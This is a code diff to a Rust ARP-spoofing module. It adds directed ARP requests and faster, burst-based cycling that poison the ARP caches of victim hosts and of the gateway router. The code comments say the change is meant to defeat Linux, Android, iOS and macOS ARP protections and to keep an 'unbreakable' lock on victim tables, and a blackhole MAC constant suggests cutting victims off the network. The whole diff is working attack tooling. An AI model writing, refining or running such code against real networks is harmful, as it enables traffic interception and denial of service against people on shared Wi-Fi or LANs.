@@ -16,7 +16,7 @@ pub fn reset_target_add_count() {
     SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
 }
 
-use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
+use crate::spoofer::raw_l2::{craft_arp_reply, craft_directed_arp_request, RawL2Sender};
 use crate::types::{Host, HostStatus, MacAddress};
 
 /// Locally administered unicast blackhole MAC address.
@@ -268,16 +268,20 @@ impl ArpSpoofer {
                 let current_mode = *mode.read();
                 let num_hosts = hosts.len();
 
-                // High-performance adaptive pacing:
-                // Smoothly spaces packet transmissions across ~1.0 second so router ARP storm
-                // filters, packet drop queues, and local NIC TX descriptors are never overwhelmed.
-                let per_host_delay = if num_hosts <= 5 {
-                    Duration::from_millis(40)
-                } else if num_hosts <= 20 {
-                    Duration::from_millis(20)
+                // High-efficiency adaptive pacing and frequency:
+                // - For small to medium networks (<= 10 targets), cycle at 5.5 Hz (180ms) with immediate dual-burst
+                //   and directed ARP requests to guarantee an unbreakable, instantaneous lock on victim ARP tables.
+                // - For large-scale networks (up to 500 hosts), pace transmissions smoothly across 400-500ms
+                //   so router ARP storm filters and NIC TX buffers are never overwhelmed.
+                let (target_cycle, per_host_delay, is_small_network) = if num_hosts <= 10 {
+                    (Duration::from_millis(180), Duration::ZERO, true)
+                } else if num_hosts <= 50 {
+                    (Duration::from_millis(250), Duration::from_micros(1000), false)
+                } else if num_hosts <= 100 {
+                    (Duration::from_millis(350), Duration::from_micros(1000), false)
                 } else {
-                    let micros = (1_000_000 / num_hosts).clamp(1000, 20_000) as u64;
-                    Duration::from_micros(micros)
+                    let micros = (400_000 / num_hosts).clamp(400, 2000) as u64;
+                    (Duration::from_millis(500), Duration::from_micros(micros), false)
                 };
 
                 let sweep_start = std::time::Instant::now();
@@ -314,9 +318,17 @@ impl ArpSpoofer {
                             _ => (local_mac, local_mac),
                         };
 
-                        // Poison target host: Gateway IP is at spoof_gw_mac.
-                        // Ethernet frame source MAC MUST be local_mac (transmitting station address on medium)
-                        // so Wi-Fi APs and 802.11/NDIS firmware deliver the packet rather than dropping it.
+                        // 1. Poison Target Host: Gateway IP is at spoof_gw_mac.
+                        // Send directed ARP Request ("Who has host.ip? Tell gateway_ip at spoof_gw_mac")
+                        // and unsolicited ARP Reply. This forces ALL operating systems (including Linux/Android
+                        // with arp_accept=0 and iOS/macOS with strict ARP validation) to update their ARP cache.
+                        let pkt_host_req = craft_directed_arp_request(
+                            host.mac,
+                            local_mac,
+                            gateway_ip,
+                            spoof_gw_mac,
+                            host.ip,
+                        );
                         let pkt_host_reply = craft_arp_reply(
                             host.mac,
                             local_mac,
@@ -325,13 +337,17 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
+                        let _ = s.send_frame(&pkt_host_req);
                         let _ = s.send_frame(&pkt_host_reply);
 
-                        // Micro-delay between host packet and gateway packet to prevent back-to-back collision
-                        thread::sleep(Duration::from_micros(100));
-
-                        // Poison gateway: Host IP is at spoof_host_mac.
-                        // Ethernet frame source MAC MUST be local_mac.
+                        // 2. Poison Gateway Router: Host IP is at spoof_host_mac.
+                        let pkt_gw_req = craft_directed_arp_request(
+                            gateway_mac,
+                            local_mac,
+                            host.ip,
+                            spoof_host_mac,
+                            gateway_ip,
+                        );
                         let pkt_gw_reply = craft_arp_reply(
                             gateway_mac,
                             local_mac,
@@ -340,32 +356,30 @@ impl ArpSpoofer {
                             gateway_ip,
                             gateway_mac,
                         );
+                        let _ = s.send_frame(&pkt_gw_req);
                         let _ = s.send_frame(&pkt_gw_reply);
 
-                        // Dual-burst on smaller networks where medium is completely unconstrained
-                        if num_hosts <= 10 {
+                        // Dual-burst on Wi-Fi/Ethernet for small/medium target sets to prevent packet drops
+                        if is_small_network {
+                            let _ = s.send_frame(&pkt_host_req);
                             let _ = s.send_frame(&pkt_host_reply);
+                            let _ = s.send_frame(&pkt_gw_req);
                             let _ = s.send_frame(&pkt_gw_reply);
                         }
 
-                        // Pace between consecutive hosts
-                        thread::sleep(per_host_delay);
+                        // Micro-pace between consecutive hosts if in large target mode
+                        if per_host_delay > Duration::ZERO {
+                            thread::sleep(per_host_delay);
+                        }
                     }
                 }
 
-                // If sweep completed faster than target cycle (1.0s or 500ms for small target counts),
-                // sleep the remainder in responsive 50ms chunks.
+                // Sleep the remainder of target_cycle in responsive 20ms chunks
                 let elapsed = sweep_start.elapsed();
-                let target_cycle = if num_hosts <= 5 {
-                    Duration::from_millis(500)
-                } else {
-                    Duration::from_millis(1000)
-                };
-
                 if elapsed < target_cycle {
                     let mut remaining = target_cycle - elapsed;
                     while remaining > Duration::ZERO && running.load(Ordering::Relaxed) {
-                        let chunk = remaining.min(Duration::from_millis(50));
+                        let chunk = remaining.min(Duration::from_millis(20));
                         thread::sleep(chunk);
                         remaining = remaining.saturating_sub(chunk);
                     }
